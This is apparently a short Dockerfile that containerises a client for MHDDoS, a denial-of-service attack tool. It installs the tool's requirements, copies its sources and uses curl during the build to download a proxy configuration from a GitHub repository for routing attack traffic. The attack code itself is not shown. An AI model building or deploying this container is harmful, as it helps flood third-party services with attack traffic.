FROM python:3

WORKDIR /client
COPY src/MHDDoS/requirements.txt /client/MHDDoS/requirements.txt
RUN pip install -r MHDDoS/requirements.txt
COPY src/ /client

RUN curl -o MHDDoS/config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json


CMD [ "python", "./main.py" ]